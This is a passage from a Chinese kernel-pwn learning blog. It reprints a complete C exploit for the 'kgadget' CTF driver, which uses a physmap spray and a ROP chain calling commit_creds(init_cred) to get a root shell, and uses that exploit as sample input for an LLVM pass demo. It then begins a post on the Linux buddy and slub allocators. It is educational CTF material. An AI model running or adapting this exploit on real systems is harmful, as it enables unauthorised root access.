class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spray content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用下面的命令可以生成.ll文件准备输入到LLVM中：<code>clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll</code></p>
<p>生成的.ll文件的前面一部分内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;firstLLVMtest.c&#x27;</span><br><span class="line">source_filename = &quot;firstLLVMtest.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@commit_creds = dso_local constant i64 -2129882400, align 8</span><br><span class="line">@init_cred = dso_local constant i64 -2103003392, align 8</span><br><span class="line">@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8</span><br><span class="line">@ret = dso_local constant i64 -2130705924, align 8</span><br><span class="line">@poprdi_ret = dso_local constant i64 -2130131216, align 8</span><br><span class="line">@poprsp_ret = dso_local constant i64 -2129361968, align 8</span><br><span class="line">@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8</span><br><span class="line">@.str = private unnamed_addr constant [23 x i8] c&quot;Status has been saved.\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;%#5x\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [4 x i8] c&quot;   \00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [6 x i8] c&quot;%02x \00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [4 x i8] c&quot;%s\0A\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [34 x i8] c&quot;\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [27 x i8] c&quot;\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [30 x i8] c&quot;\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.8 = private unnamed_addr constant [24 x i8] c&quot;Ready to get root......\00&quot;, align 1</span><br><span class="line">@.str.9 = private unnamed_addr constant [20 x i8] c&quot;Failed to get root!\00&quot;, align 1</span><br><span class="line">@.str.10 = private unnamed_addr constant [10 x i8] c&quot;Root got!\00&quot;, align 1</span><br><span class="line">@.str.11 = private unnamed_addr constant [8 x i8] c&quot;/bin/sh\00&quot;, align 1</span><br><span class="line">@page_size = common dso_local global i64 0, align 8</span><br><span class="line">@user_cs = common dso_local global i64 0, align 8</span><br><span class="line">@user_rflags = common dso_local global i64 0, align 8</span><br><span class="line">@user_sp = common dso_local global i64 0, align 8</span><br><span class="line">@user_ss = common dso_local global i64 0, align 8</span><br><span class="line">@.str.12 = private unnamed_addr constant [21 x i8] c&quot;Spray content below:\00&quot;, align 1</span><br><span class="line">@.str.13 = private unnamed_addr constant [13 x i8] c&quot;/dev/kgadget\00&quot;, align 1</span><br><span class="line">@dev = common dso_local global i32 0, align 4</span><br><span class="line">@.str.14 = private unnamed_addr constant [35 x i8] c&quot;Cannot open device \22/dev/kgadget\22!\00&quot;, align 1</span><br><span class="line">@.str.15 = private unnamed_addr constant [23 x i8] c&quot;Spraying physmap......\00&quot;, align 1</span><br><span class="line">@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16</span><br><span class="line">@.str.16 = private unnamed_addr constant [14 x i8] c&quot;Mmap Failure!\00&quot;, align 1</span><br><span class="line">@guess = common dso_local global i64 0, align 8</span><br><span class="line">@.str.17 = private unnamed_addr constant [30 x i8] c&quot;Ready to turn to kernel......\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save_status() #0 &#123;</span><br><span class="line">  call void asm sideeffect &quot;mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;&quot;, &quot;~&#123;dirflag&#125;,~&#123;fpsr&#125;,~&#123;flags&#125;&quot;() #6, !srcloc !2</span><br><span class="line">  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @info_log(i8* %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** %2, align 8</span><br><span class="line">  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码是可读的，用另外一种方式阐述了代码的执行流程。</p>
<p>然后使用下面的命令生成.so文件，<a target="_blank" rel="noopener" href="http://xn--LLVMLLVMFirst-ho1u05k87q6l3chnf7ltr62gj0zg.so">作为LLVM的动态链接库LLVMFirst.so</a>：<br />
<code>clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags</code></p>
<p>最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加<code>&gt; [文件名]</code>来获取：<br />
<code>opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll</code></p>
<p>其执行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: save_status</span><br><span class="line">Hello: info_log</span><br><span class="line">Hello: print_binary</span><br><span class="line">Hello: error_log</span><br><span class="line">Hello: success_log</span><br><span class="line">Hello: getShell</span><br><span class="line">Hello: makeROP</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure>
<p>可以看到输出了很多Hello开头的行，这是因为在上面的C++程序中，我们在匿名命名空间中重载了runOnFunction函数，让LLVM输出Hello之后再输出函数的名字，这样就有了上面的几行。</p>
<p>在LLVM pass中可以对函数、函数中的循环、函数中的操作指令等一系列对象进行记录、修改等各种操作，具体的操作类参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165736882716782246435214&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=llvm%20pass&amp;spm=1018.2226.3001.4187">资料</a>。在下一篇文章中笔者会详细分析一道题，过一下LLVM pass类pwn题的流程。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/" class="post-title-link" itemprop="url">Kernel pwn 入门 (8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:34:41" itemprop="dateCreated datePublished" datetime="2023-02-28T22:34:41+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本篇文章中笔者不打算分析题目，而是对Linux中的slub系统进行深入的学习与分析。</p>
<p>参考资料：上一篇文章中提到的三篇与kernel内存分配有关的文章。在阅读本文时，建议与这三篇文章对照食用。</p>
<h1 id="1-伙伴系统重温"><a class="markdownIt-Anchor" href="#1-伙伴系统重温"></a> 1. 伙伴系统重温</h1>
<p>slub作为小块内存的分配器，其在伙伴系统之下运作，因此首先我们还是来回顾一下伙伴系统。</p>
<p>在第4篇文章中，我们简单介绍了伙伴系统的运作机理，以页为单位进行大块内存空间的分配与释放。其具体的数据结构如下图所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 伙伴系统的一个块，描述1,2,4,8,16,32,64,128,256,512或1024个连续页框的块 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 指向这个块中所有空闲小块的第一个页描述符，这些小块会按照MIGRATE_TYPES类型存放在不同指针里 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">/* 空闲小块的个数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>需要注意的是，伙伴系统并不是内核内存分配系统中最上层的结构，在其上还有其他的结构，但在Kernel pwn中我们对更为上层的结构接触较少，因此这里只介绍到伙伴系统。</strong></font></p>
<p>上图的<code>free_area</code>表示一系列页的链表的数组。而在Linux系统内核中，一共有11个这样的<code>free_area</code>，分别保存所有大小为1,2,4,8,16,32,64,128,256,512,1024个页大小的内存空间（这些空间都是连续的），在<code>free_area</code>中，<code>free_list</code>是一系列这样的内存空间组成的链表的数组，内含多个链表，这些链表中的内存空间大小相同，但属性不同，对于<code>MIGRATE_TYPES</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">	MIGRATE_UNMOVABLE,</span><br><span class="line">	MIGRATE_MOVABLE,</span><br><span class="line">	MIGRATE_RECLAIMABLE,</span><br><span class="line">	MIGRATE_PCPTYPES,	<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">	MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">	 * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">	 * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">	 * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">	 * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">	 * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 